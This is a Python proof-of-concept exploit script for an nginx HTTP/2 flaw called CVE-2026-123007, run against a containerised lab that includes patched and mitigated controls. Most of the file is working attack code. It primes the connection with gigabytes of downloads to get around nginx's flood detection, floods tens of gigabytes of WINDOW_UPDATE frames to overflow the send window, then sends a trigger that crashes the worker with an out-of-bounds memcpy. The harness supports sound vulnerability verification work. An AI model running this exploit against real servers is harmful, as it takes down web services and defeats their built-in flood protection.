#!/usr/bin/env python3
"""Deterministic worker-death PoC for CVE-2026-123007 (NGINX2Root) — F1.

Drives the full Xint §5.1.2 kill chain against a lab TLS endpoint and
proves the controls stay alive.  All phases run over TLS (ALPN h2)
against the lab's `:443` service ports.

  0. prime — nginx 1.31.8 terminates an h2 connection whose framing
     overhead outruns its payload by 8:1 ("http2 flood detected":
     total_bytes/8 > payload_bytes + 1 MiB, ngx_http_v2.c).  A pure
     WINDOW_UPDATE flood trips it within a few hundred MB — observed as
     GOAWAY(NO_ERROR) ~30 s before the client notices (the lingering
     close keeps draining).  payload_bytes grows with every byte the
     server SENDS, and connection credit costs only 13 wire-bytes per
     2 GiB returned, so ~10 GiB of real /big.bin downloads (waves of
     <=100 concurrent streams, each read to END_STREAM) raises the
     flood allowance to ~80 GiB for a few KB of client frames.  The
     52 GiB WINDOW_UPDATE flood then fits with ~2 GiB of headroom
     (total_peak/8 = ~7.8 GiB < ~10 GiB payload).
     priming leaves no open streams and returns flow-control accounting
     untouched, but it leaves the connection send window part-spent, so
     the ritual grants the window up to NGX_HTTP_V2_MAX_WINDOW relative
     to that leftover.  End to end a vuln run measures ~3 min (~40 s
     priming, ~15 s ritual, ~110 s flood, seconds for the trigger); the
     controls terminate inside the ritual in under a minute.

  1. ritual — the validated staging sequence imported from diagnose.py
     (staging_ritual: zero initial stream window, staged GET /big.bin
     streams, connection window to NGX_HTTP_V2_MAX_WINDOW, first-return
     WINDOW_UPDATE, RST-drain), staged on fresh stream ids above the
     priming streams.  On the vulnerable build this leaves
     h2c->send_window past NGX_HTTP_V2_MAX_WINDOW, so the capacity check
     `increment > NGX_HTTP_V2_MAX_WINDOW - send_window` underflows and
     every further WINDOW_UPDATE passes.
     On the patched build the connection already ends here — its
     capacity check counts queued-but-unsent DATA and rejects the first
     return with FLOW_CONTROL_ERROR.  That is the SURVIVED control: the
     crash chain is unreachable, so no flood is even attempted.
  2. flood — stream-0 WINDOW_UPDATE frames with increment 0x7FFFFFFF
     until h2c->send_window >= 2^63:
         N = ceil((2^63 - (NGX_HTTP_V2_MAX_WINDOW + FIRST_RETURN))
                  / 0x7FFFFFFF)
     computed from the SAME FIRST_RETURN constant the oracle validated
     (imported from diagnose.py, never duplicated), plus a small
     overshoot margin (the trigger threshold is "sign bit set"; the
     overshoot stays orders of magnitude below the 2^64 wraparound).
     ~4.29 billion frames, ~52 GiB / 55.8 GB of TLS payload.  A pending
     zero-window stream stays open so the connection never looks idle.
     Nothing comes back for WINDOW_UPDATEs, so nothing is read during
     the flood; progress telemetry (frames, GiB, rate, ETA) prints
     every ~30 s.  Measured here: ~110 s at ~0.5 GB/s on a primed
     connection (~35 s at ~1.8 GB/s without priming).
  3. trigger — a fresh stream (id above every priming/ritual stream):
     HEADERS GET /big.bin END_STREAM, then a 1 MiB stream-level
     WINDOW_UPDATE, then a liveness PING ordered behind it.  Expected
     chain on the vulnerable build (Xint §5.1.2): the filter uses the
     connection window as an (off_t) limit — negative at >= 2^63 —
     casts it to size_t, ngx_http_v2_filter_get_shadow sets
     chunk->last = pos + huge-negative, and the TLS output path
     computes size = last - pos and ngx_memcpy's that size; glibc's
     huge-copy path touches non-canonical memory and the worker takes
     SIGSEGV.  The master respawns it; the client sees the connection
     die with no GOAWAY and no PING answer.

Verdicts:
  vuln:443      WORKER-DIED — the client observed the connection die
                (RST / EOF / abrupt TLS teardown / send failure) right
                after the trigger, with NO GOAWAY (a GOAWAY is written
                by a live worker) and the liveness PING unanswered.
                Server-side confirmation (the probe container cannot
                read docker logs):
                    docker compose logs --since 10m vuln 2>&1 | \
                        grep -E "worker process .* exited on signal 11|segfault"
  fixed:443     SURVIVED — the connection ended during the ritual (the
                patched capacity check rejects the first return with
                FLOW_CONTROL_ERROR / a clean EOF; on a primed connection
                the FIN can surface one drain later, at the RST drain)
                BEFORE any flood; the crash chain is unreachable on the
                patched build.  The worker-death grep over `fixed` logs
                must stay empty (RUN_CRASH=1 ./lab/verify.sh asserts it).
  mitigated:443 NOT-H2 — TLS ALPN never negotiates h2 (`http2 off`),
                so no part of the chain exists.

Controls run BEFORE the vulnerable target (default order fixed,
mitigated, vuln) so a surprise cannot contaminate them.  Exit code is 0
only if every target lands in {SURVIVED, NOT-H2, WORKER-DIED}.

Lab-only (S4/R1): TLS verification is disabled for the lab's
self-signed certificate exactly as in h2lib, and every target is an
in-container service name behind loopback-published ports.  The
intentional worker kill on `vuln` is the point of the PoC; nothing
outside the lab is touched.

Run inside the lab's probe container:

    docker compose exec probe python /poc/crash.py                # matrix
    docker compose exec probe python /poc/crash.py --target vuln:443
    docker compose exec probe python /poc/crash.py --target vuln:443 \
        --max-frames 5000000     # bounded flood (smoke test / rate probe)
"""

from __future__ import annotations

import argparse
import socket
import ssl
import struct
import sys
import time

from diagnose import (
    FIRST_RETURN,
    N_STREAMS,
    RITUAL_ALIVE,
    RITUAL_CONN_RESET,
    RITUAL_EOF,
    RITUAL_ERROR,
    RITUAL_FCE,
    RITUAL_NOT_H2,
    RITUAL_RESET,
    RITUAL_RST_SEND_FAIL,
    RITUAL_TIMEOUT,
    parse_target,
    staging_ritual,
)
from h2lib import (
    DATA,
    FLAG_ACK,
    FLAG_END_STREAM,
    GOAWAY,
    H2Client,
    H2_DEFAULT_CONN_WINDOW,
    H2_MAX_WINDOW,
    HEADERS,
    PING,
    RST_STREAM,
    WINDOW_UPDATE,
    build_frame,
)

# --- crash constants ---------------------------------------------------------

WU_INCREMENT = H2_MAX_WINDOW       # 0x7FFFFFFF: the largest legal increment
TRIGGER_WINDOW = 1 << 63           # (off_t) sign bit — the poison threshold
FLOOD_MARGIN_FRAMES = 16           # overshoot insurance: covers any start
                                   # window short of the assumed invariant;
                                   # +16*2^31 window units is far below 2^64
TRIGGER_STREAM_GRANT = 1 << 20     # 1 MiB stream credit that wakes the filter
TRIGGER_PING = b"crash001"         # liveness probe ordered behind the trigger
FLOOD_BLOB_FRAMES = 16384          # frames per sendall blob (~208 KiB)
FLOOD_SND_TIMEOUT = 120.0          # per-write ceiling during the flood
FLOOD_SNDBUF = 4 << 20             # smooth the flood through kernel buffers
PROGRESS_EVERY = 30.0              # seconds between flood telemetry lines
TRIGGER_WATCH = 12.0               # seconds watching for the worker to die

# Priming (phase 0): defeat the "http2 flood detected" heuristic by
# growing payload_bytes with real downloads before the flood.
PRIME_TARGET = 10 << 30            # payload to accumulate (~10 GiB)
PRIME_WAVE = 100                   # concurrent download streams (< 128 limit)
BIG_BIN_EST = 64 << 20             # /big.bin size estimate for wave sizing
PRIME_STREAM_GRANT = (1 << 26) + (1 << 20)   # 65 MiB covers one whole body
PRIME_TOPUP_LO = 256 << 20         # top the connection window up above this
PRIME_STALL = 30.0                 # seconds without progress aborts priming
PRIME_FILL_CAP = 64 << 20          # parse every 64 MiB: bounded memory (one
                                   # unbounded fill would absorb the whole
                                   # 2 GiB connection window before idling)

GOOD_VERDICTS = ("SURVIVED", "NOT-H2", "WORKER-DIED")
DEFAULT_TARGETS = ("fixed:443", "mitigated:443", "vuln:443")  # controls first

LOGS_HINT = ("server-side confirmation (host): docker compose logs "
             "--since 10m vuln 2>&1 | grep -E \"worker process .* exited "
             "on signal 11|segfault\"")


def say(msg: str) -> None:
    print(msg, flush=True)  # flush: docker compose exec -T block-buffers


def flood_frame_count() -> int:
    """N from the design formula, from the FIRST_RETURN the oracle validated."""
    need = TRIGGER_WINDOW - (H2_MAX_WINDOW + FIRST_RETURN)
    return -(-need // WU_INCREMENT) + FLOOD_MARGIN_FRAMES


def describe_frame(f: dict) -> str:
    t = f["type"]
    if t == GOAWAY:
        return f"GOAWAY err={f.get('error')} last_sid={f.get('last_sid')}"
    if t == PING:
        return f"PING{'-ACK' if f['flags'] & FLAG_ACK else ''} {f['payload']!r}"
    if t == HEADERS:
        return f"HEADERS sid={f['sid']} len={f['len']}"
    if t == WINDOW_UPDATE:
        return f"WINDOW_UPDATE sid={f['sid']} inc={f.get('increment')}"
    return f"type={t} sid={f['sid']} len={f['len']} flags={f['flags']}"


def _topup_window(c: H2Client, window_est: int) -> int:
    """Refill the connection window to NGX_HTTP_V2_MAX_WINDOW.

    The estimate deducts only bytes we have RECEIVED; nginx deducts its
    window at frame-build time, so the true window is never above the
    estimate and the increment always passes the capacity check.
    """
    inc = H2_MAX_WINDOW - max(window_est, 0)
    if inc > 0:
        c.window_update(0, inc)
        return H2_MAX_WINDOW
    return window_est


def prime_payload(c: H2Client, first_sid: int, ev: list[str],
                  authority: str) -> tuple[int, bool, int]:
    """Phase 0: grow nginx's flood-heuristic allowance with real downloads.

    Runs on the same connection the crash will use (payload_bytes is
    per-connection): waves of <=PRIME_WAVE concurrent GET /big.bin
    streams, each granted a full-body stream window, read to END_STREAM
    so priming leaves no open streams and flow-control accounting
    untouched.  Returns (next free odd sid, ok, payload bytes read,
    estimated connection send window left over).
    """
    sid = first_sid
    payload = 0
    opened = 0
    window_est = H2_DEFAULT_CONN_WINDOW
    t0 = time.monotonic()
    try:
        while payload < PRIME_TARGET:
            need = PRIME_TARGET - payload
            wave = min(PRIME_WAVE, max(1, -(-need // BIG_BIN_EST)))
            wave_sids = []
            for _ in range(wave):
                c.open_stream(sid, "/big.bin", authority)
                c.window_update(sid, PRIME_STREAM_GRANT)
                wave_sids.append(sid)
                sid += 2
            opened += wave
            window_est = _topup_window(c, window_est)

            done: set[int] = set()
            progress = (payload, 0)
            deadline = time.monotonic() + PRIME_STALL
            while len(done) < len(wave_sids):
                c.fill(0.5, cap=PRIME_FILL_CAP)
                frames = c.parse_buffered()
                c.frames.clear()  # priming never replays them; bound memory
                if c.eof or c.reset:
                    ev.append(f"priming aborted: peer {'EOF' if c.eof else 'RST'} "
                              f"after {payload} bytes")
                    return sid, False, payload, window_est
                for f in frames:
                    if f["type"] == DATA:
                        payload += f["len"]
                        window_est -= f["len"]
                        if f["flags"] & FLAG_END_STREAM:
                            done.add(f["sid"])
                    elif f["type"] in (HEADERS, RST_STREAM) and \
                            f["flags"] & FLAG_END_STREAM:
                        done.add(f["sid"])
                    elif f["type"] == GOAWAY:
                        ev.append(f"priming aborted: {describe_frame(f)} "
                                  f"after {payload} bytes")
                        return sid, False, payload, window_est
                if window_est < PRIME_TOPUP_LO:
                    window_est = _topup_window(c, window_est)
                now = (payload, len(done))
                if now != progress:
                    progress = now
                    deadline = time.monotonic() + PRIME_STALL
                elif time.monotonic() > deadline:
                    ev.append(f"priming stalled at {payload} bytes "
                              f"({len(done)}/{len(wave_sids)} streams done)")
                    return sid, False, payload, window_est
    except OSError as exc:
        ev.append(f"priming failed ({exc!r}) after {payload} bytes")
        return sid, False, payload, window_est
    flood_gib = flood_frame_count() * 13 / (1 << 30)
    ev.append(
        f"primed {payload / (1 << 30):.2f} GiB of /big.bin over {opened} "
        f"streams in {time.monotonic() - t0:.1f}s — flood-detect allowance "
        f"~{8 * payload / (1 << 30):.0f} GiB vs ~{payload / (1 << 30) + flood_gib:.0f} GiB "
        "expected total traffic")
    return sid, True, payload, window_est


def flood_window(c: H2Client, max_frames: int | None = None,
                 blob_frames: int = FLOOD_BLOB_FRAMES) -> dict:
    """Phase 2: push h2c->send_window to >= 2^63 with stream-0 WINDOW_UPDATEs.

    The ritual left send_window past NGX_HTTP_V2_MAX_WINDOW, so the
    vulnerable capacity check underflows and every frame passes; each adds
    WU_INCREMENT.  Nothing comes back for WINDOW_UPDATEs, so nothing is
    read — pre-built blobs go out in a tight sendall loop with progress
    telemetry every PROGRESS_EVERY seconds.

    Returns telemetry: frames sent, bytes, wall time, effective rate, the
    projected send_window, and the OSError that ended the flood early
    (else None).
    """
    n_target = flood_frame_count()
    n_frames = n_target if max_frames is None else min(max_frames, n_target)
    window0 = H2_MAX_WINDOW + FIRST_RETURN
    one = build_frame(WINDOW_UPDATE, 0, 0, struct.pack(">I", WU_INCREMENT))
    blob = one * blob_frames
    capped = max_frames is not None and max_frames < n_target
    say(f"[flood] plan: {n_frames:,} stream-0 WINDOW_UPDATE frames of "
        f"{WU_INCREMENT} ({len(one)} B each = {n_frames * len(one) / (1 << 30):.1f} GiB), "
        f"send_window {window0:,} -> ~{window0 + n_frames * WU_INCREMENT:,}"
        + (" [CAPPED below the trigger threshold by --max-frames]" if capped else ""))

    c.sock.settimeout(FLOOD_SND_TIMEOUT)
    t0 = time.monotonic()
    report = t0 + PROGRESS_EVERY
    sent = 0
    err: OSError | None = None
    try:
        while sent < n_frames:
            n = min(blob_frames, n_frames - sent)
            c.sock.sendall(blob if n == blob_frames else blob[: n * len(one)])
            sent += n
            now = time.monotonic()
            if now >= report:
                rate = sent / (now - t0)
                eta = (n_frames - sent) / rate if rate else float("inf")
                say(f"[flood] {sent:,} frames ({sent * len(one) / (1 << 30):.2f} GiB) "
                    f"at {rate / 1e6:.2f} Mfr/s ({rate * len(one) / 1e6:.0f} MB/s), "
                    f"ETA {eta:.0f}s")
                report = now + PROGRESS_EVERY
    except OSError as exc:  # socket.timeout, EPIPE, ECONNRESET, SSLError, ...
        err = exc
    finally:
        c.sock.settimeout(5.0)
    wall = time.monotonic() - t0
    return {
        "frames": sent,
        "bytes": sent * len(one),
        "wall": wall,
        "rate_mfrs": sent / wall / 1e6 if wall > 0 else 0.0,
        "window0": window0,
        "reached_window": window0 + sent * WU_INCREMENT,
        "target_frames": n_target,
        "capped": capped,
        "error": err,
    }


def fire_trigger(c: H2Client, authority: str, sid: int
                 ) -> tuple[list[str], str, dict | None]:
    """Phase 3: open a fresh stream, grant it 1 MiB, watch for the worker death.

    The liveness PING is ordered AFTER the stream grant in the byte
    stream, so a worker that answers it necessarily survived the trigger.
    Returns (evidence lines, observation, goaway frame or None) with
    observation in {"send-failed", "read-failed", "tls-error", "reset",
     "eof", "ping-answered", "goaway", "timeout"}.  A GOAWAY means a
    LIVE worker terminated the connection — never a worker death.
    """
    ev: list[str] = []
    goaway: dict | None = None
    try:
        c.open_stream(sid, "/big.bin", authority)
        c.window_update(sid, TRIGGER_STREAM_GRANT)
        c.ping(TRIGGER_PING)
        ev.append(f"trigger sent: HEADERS GET /big.bin END_STREAM on stream "
                  f"{sid}, {TRIGGER_STREAM_GRANT >> 20} MiB stream "
                  "WINDOW_UPDATE, liveness PING behind it")
    except OSError as exc:
        ev.append(f"trigger send failed ({exc!r}) — the worker died before "
                  "the trigger fully landed (client-side death evidence)")
        return ev, "send-failed", None

    deadline = time.monotonic() + TRIGGER_WATCH
    while time.monotonic() < deadline:
        try:
            c.fill(1.0)
        except ssl.SSLError as exc:
            # abrupt teardown without close_notify: the worker died mid-write
            ev.append(f"abrupt TLS teardown ({exc!r}) — worker died without "
                      "TLS close_notify")
            return ev, "tls-error", goaway
        except OSError as exc:
            ev.append(f"trigger read failed ({exc!r})")
            return ev, "read-failed", goaway
        frames = c.parse_buffered()
        for f in frames:
            ev.append(f"trigger response: {describe_frame(f)}")
            if f["type"] == GOAWAY:
                goaway = f
        if c.reset:
            ev.append("connection reset by peer (RST) after the trigger")
            return ev, "reset", goaway
        if c.eof:
            ev.append("clean peer EOF (FIN) after the trigger")
            return ev, "eof", goaway
        if any(f["type"] == PING and f["flags"] & FLAG_ACK
               and f["payload"] == TRIGGER_PING for f in frames):
            ev.append(f"liveness PING answered ({TRIGGER_PING!r}) — the "
                      "worker processed the trigger and survived")
            return ev, "ping-answered", goaway
    return ev, ("goaway" if goaway is not None else "timeout"), goaway


def ritual_unclear_line(outcome: str, detail: Exception | None) -> str:
    if outcome == RITUAL_RESET:
        return ("connection reset (RST) during the ritual — the crash chain "
                "was never armed")
    if outcome == RITUAL_RST_SEND_FAIL:
        return f"send failed while sending RST_STREAMs ({detail!r})"
    if outcome == RITUAL_TIMEOUT:
        return "timeout during the ritual"
    if outcome == RITUAL_CONN_RESET:
        return "connection reset by peer during the ritual"
    if outcome == RITUAL_ERROR:
        return f"ritual error: {type(detail).__name__}: {detail}"
    return f"ritual outcome {outcome!r}"


def crash_target(host: str, port: int, max_frames: int | None = None,
                 blob_frames: int = FLOOD_BLOB_FRAMES) -> dict:
    ev: list[str] = []
    spec = f"{host}:{port}"
    c: H2Client | None = None
    try:
        c = H2Client(host, port, tls=True)  # connect/TLS/ALPN errors per-target
    except ssl.SSLError as exc:
        msg = str(exc).lower()
        if "application protocol" in msg or "alpn" in msg:
            return {"verdict": "NOT-H2", "phase": "handshake",
                    "evidence": [f"TLS ALPN refused h2 ({exc!r}) — http2 off"]}
        return {"verdict": "ERROR", "phase": "handshake",
                "error": f"{type(exc).__name__}: {exc}", "evidence": ev}
    except (OSError, ValueError) as exc:
        return {"verdict": "ERROR", "phase": "handshake",
                "error": f"{type(exc).__name__}: {exc}", "evidence": ev}
    try:
        # --- phase 0 + 1: prime, then the validated ritual -------------------
        ctx: dict = {}

        def _prime(c2: H2Client, first_sid: int, ev2: list[str]):
            next_sid, ok, _got, win = prime_payload(c2, first_sid, ev2, spec)
            ctx["next_sid"] = next_sid
            ctx["prime_ok"] = ok
            return next_sid, win

        outcome, phase, detail = staging_ritual(
            c, streams=N_STREAMS, authority=spec, ev=ev, prime=_prime)
        if outcome == RITUAL_NOT_H2:
            return {"verdict": "NOT-H2", "phase": phase, "evidence": ev}
        if outcome in (RITUAL_FCE, RITUAL_EOF):
            # The peer terminated during the ritual.  On a fresh connection
            # the patched capacity check rejects the first return itself
            # (FLOW_CONTROL_ERROR or a FIN inside the bounded drain); on a
            # primed connection the staged queue runs deeper, so the same
            # termination can surface as a clean EOF one drain later, at the
            # RST drain.  Either way the crash chain was never armed: no
            # flood, no trigger, worker untouched.
            ev.append("the peer terminated during the ritual (" + phase
                      + " phase) — the crash chain is unreachable on this "
                      "build (no flood attempted, worker untouched)")
            return {"verdict": "SURVIVED", "phase": phase, "evidence": ev}
        if outcome != RITUAL_ALIVE:
            return {"verdict": "UNCLEAR", "phase": phase,
                    "evidence": ev + [ritual_unclear_line(outcome, detail)]}
        if not ctx.get("prime_ok", False):
            return {"verdict": "UNCLEAR", "phase": "prime",
                    "evidence": ev + ["priming incomplete — the flood "
                                      "allowance was not grown; aborting "
                                      "before the flood"]}
        # stream ids: ritual used next_sid .. next_sid+2*(N_STREAMS-1)
        keepalive_sid = ctx["next_sid"] + 2 * N_STREAMS
        trigger_sid = keepalive_sid + 2

        # --- phase 2: flood send_window to >= 2^63 --------------------------
        # A pending zero-window stream keeps h2c->processing > 0 for the
        # whole flood so the connection is never treated as idle; it costs
        # nothing (no DATA can be built against a 0 stream window; only
        # its tiny response HEADERS frame comes back) and dies with the
        # worker at the trigger.
        c.open_stream(keepalive_sid, "/big.bin", spec)
        ev.append(f"keepalive stream {keepalive_sid} opened (pending on its "
                  "0 stream window) so the flood connection is never idle")
        try:
            c.raw.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, FLOOD_SNDBUF)
        except OSError:
            pass  # best effort: pacing only, correctness does not depend on it
        t = flood_window(c, max_frames=max_frames, blob_frames=blob_frames)
        ev.append(
            f"flood: {t['frames']:,} frames / {t['bytes'] / (1 << 30):.2f} GiB "
            f"in {t['wall']:.1f}s — {t['rate_mfrs']:.2f} Mfr/s "
            f"({t['rate_mfrs'] * 13:.0f} MB/s effective), projected "
            f"send_window ~{t['reached_window']:,}")
        if t["error"] is not None:
            ev.append(f"flood connection died after {t['frames']:,} frames: "
                      f"{t['error']!r} — check the peer's logs for why "
                      "(the trigger was never armed)")
            return {"verdict": "UNCLEAR", "phase": "flood", "evidence": ev}
        if t["frames"] < t["target_frames"]:
            ev.append("flood capped below the trigger threshold "
                      "(--max-frames): the trigger is not expected to fire")
            return {"verdict": "UNCLEAR", "phase": "flood", "evidence": ev}

        # --- phase 3: the trigger -------------------------------------------
        tev, obs, goaway = fire_trigger(c, spec, trigger_sid)
        ev.extend(tev)
        if goaway is not None:
            # A GOAWAY is written by a LIVE worker terminating the connection
            # on purpose — whatever happened, it is not a worker death.
            ev.append(f"the peer closed with {describe_frame(goaway)} — a live "
                      "worker terminated the connection; the expected "
                      "OOB-memcpy chain did not run to completion on this "
                      "build")
            return {"verdict": "UNCLEAR", "phase": "trigger", "evidence": ev}
        if obs in ("reset", "eof", "tls-error", "send-failed", "read-failed"):
            ev.append(f"client observed the connection die ({obs}) right "
                      "after the trigger and the liveness PING was never "
                      "answered — the worker took the OOB memcpy path")
            ev.append(LOGS_HINT)
            return {"verdict": "WORKER-DIED", "phase": "trigger", "evidence": ev}
        if obs == "ping-answered":
            return {"verdict": "UNCLEAR", "phase": "trigger", "evidence": ev}
        return {"verdict": "UNCLEAR", "phase": "trigger",
                "evidence": ev + [f"trigger observation ended without a "
                                  f"death signal: {obs}"]}
    except (OSError, ValueError) as exc:
        return {"verdict": "ERROR", "phase": "-",
                "error": f"{type(exc).__name__}: {exc}", "evidence": ev}
    finally:
        if c is not None:
            c.close()


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--target", action="append", metavar="HOST:PORT",
                    help="run against this target only (repeatable); default: "
                         "the three lab TLS targets, controls first "
                         "(fixed:443 mitigated:443 vuln:443)")
    ap.add_argument("--max-frames", type=int, default=None, metavar="N",
                    help="cap the flood at N WINDOW_UPDATE frames (bounded "
                         "smoke runs / rate probes; below the trigger "
                         "threshold the verdict will be UNCLEAR)")
    ap.add_argument("--blob-frames", type=int, default=FLOOD_BLOB_FRAMES,
                    metavar="N",
                    help=f"WINDOW_UPDATE frames per send blob "
                         f"(default {FLOOD_BLOB_FRAMES})")
    args = ap.parse_args()

    targets = args.target or list(DEFAULT_TARGETS)
    rc = 0
    for spec in targets:
        try:
            host, port = parse_target(spec)
        except ValueError as exc:
            say(f"[{spec}] ERROR: {exc}")
            rc = 1
            continue
        result = crash_target(host, port, max_frames=args.max_frames,
                              blob_frames=args.blob_frames)
        verdict = result["verdict"]
        line = verdict
        if verdict == "ERROR":
            line = f"ERROR: {result.get('error', 'unknown error')}"
        say(f"[{spec}] {line}")
        if result.get("phase") and result["phase"] != "-":
            say(f"    - phase: {result['phase']}")
        for e in result["evidence"]:
            say(f"    - {e}")
        if verdict not in GOOD_VERDICTS:
            rc = 1
    return rc


if __name__ == "__main__":
    sys.exit(main())
